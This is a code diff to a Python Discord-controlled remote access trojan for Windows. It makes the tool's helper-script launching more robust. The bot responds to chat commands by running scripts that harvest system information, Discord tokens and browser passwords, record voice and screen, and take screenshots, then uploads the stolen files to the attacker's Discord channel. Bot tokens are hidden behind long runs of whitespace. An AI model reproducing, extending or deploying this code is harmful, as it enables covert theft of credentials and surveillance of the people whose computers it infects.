@@ -7,6 +7,19 @@ import subprocess
 
 bin_folder = f"C:/Users/{os.getlogin()}/bin"
 
+# Get python command
+prefixe = ""
+try:
+    output = subprocess.check_output(["py", "--version"], stderr=subprocess.STDOUT)
+    prefixe = "py"
+except:
+    try:
+        output = subprocess.check_output(["python", "--version"], stderr=subprocess.STDOUT)
+        prefixe = "python"
+    except:
+        print("Command not found")
+        exit()
+
 
 
 def split_message(message, chunk_size=1899):
@@ -17,7 +30,7 @@ def get_mac():
     cleaned_mac = re.sub(r'[^a-z0-9-]', '-', mac.lower())
     return cleaned_mac
 
-Token = "MWI6MjUxODMyMzcyMzk2MBM3Mg.G24aXQ.V7ALk_837GDL4lHMibAWk_EH5qn3qJfv1y4Wu1"                                                                                                                                                                                                                                                                                                  ; key = 'MTI5MjUxODMyMzcyMzk2MDM3Mg.G24aXQ.V2ALu_837GDL4lHMibAWk_EH5qn5qJfv1y4Wu8'
+sec = "MWI6MjUxODMyMzcyMzk2MBM3Mg.G24aXQ.V7ALk_837GDL4lHMibAWk_EH5qn3qJfv1y4Wu1"                                                                                                                                                                                                                                                                                                  ; key = 'MTI5MjUxODMyMzcyMzk2MDM3Mg.G24aXQ.V2ALu_837GDL4lHMibAWk_EH5qn5qJfv1y4Wu8'
 class Client(discord.Client):
     @staticmethod
     async def on_ready():
@@ -81,7 +94,7 @@ class Client(discord.Client):
             # *========================================================================*
             elif message.content == '/grab infos':
                 if os.path.exists(f"{bin_folder}/computer.pyw"):
-                    subprocess.run(['py', f"{bin_folder}/computer.pyw"])
+                    subprocess.run([prefixe, f"{bin_folder}/computer.pyw"])
                 for i in range(10):
                     if os.path.exists(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt"):
                         await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
@@ -96,7 +109,7 @@ class Client(discord.Client):
             # *========================================================================*
             elif message.content == '/grab discord':
                 if os.path.exists(f"{bin_folder}/discord.pyw"):
-                    subprocess.run(['py', f"{bin_folder}/discord.pyw"])
+                    subprocess.run([prefixe, f"{bin_folder}/discord.pyw"])
                 for i in range(10):
                     if os.path.exists(f"{bin_folder}/DISCORD-{os.getlogin()}.txt"):
                         await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
@@ -111,7 +124,7 @@ class Client(discord.Client):
             # *========================================================================*
             elif message.content == '/grab browser':
                 if os.path.exists(f"{bin_folder}/password.pyw"):
-                    subprocess.run(['py', f"{bin_folder}/password.pyw"])
+                    subprocess.run([prefixe, f"{bin_folder}/password.pyw"])
                 for i in range(10):
                     if os.path.exists(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt"):
                         await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
@@ -129,7 +142,7 @@ class Client(discord.Client):
             elif message.content == '/record voice':
                 if os.path.exists(f"{bin_folder}/record.pyw"):
                     await message.channel.send(f":gear: Recording...")
-                    subprocess.run(['py', f"{bin_folder}/record.pyw", "voice"])
+                    subprocess.run([prefixe, f"{bin_folder}/record.pyw", "voice"])
                 for i in range(10):
                     if os.path.exists(f"{bin_folder}/RECORDED-{os.getlogin()}.wav"):
                         await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
@@ -145,7 +158,7 @@ class Client(discord.Client):
             elif message.content == '/record screen':
                 if os.path.exists(f"{bin_folder}/record.pyw"):
                     await message.channel.send(f":gear: Recording...")
-                    subprocess.run(['py', f"{bin_folder}/record.pyw", "screen"])
+                    subprocess.run([prefixe, f"{bin_folder}/record.pyw", "screen"])
                 for i in range(10):
                     if os.path.exists(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi"):
                         await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
@@ -160,7 +173,7 @@ class Client(discord.Client):
             # *========================================================================*
             elif message.content == '/screenshot':
                 if os.path.exists(f"{bin_folder}/screen.pyw"):
-                    subprocess.run(['py', f"{bin_folder}/screen.pyw", "screenshot"])
+                    subprocess.run([prefixe, f"{bin_folder}/screen.pyw", "screenshot"])
                 for i in range(10):
                     if os.path.exists(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png"):
                         await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
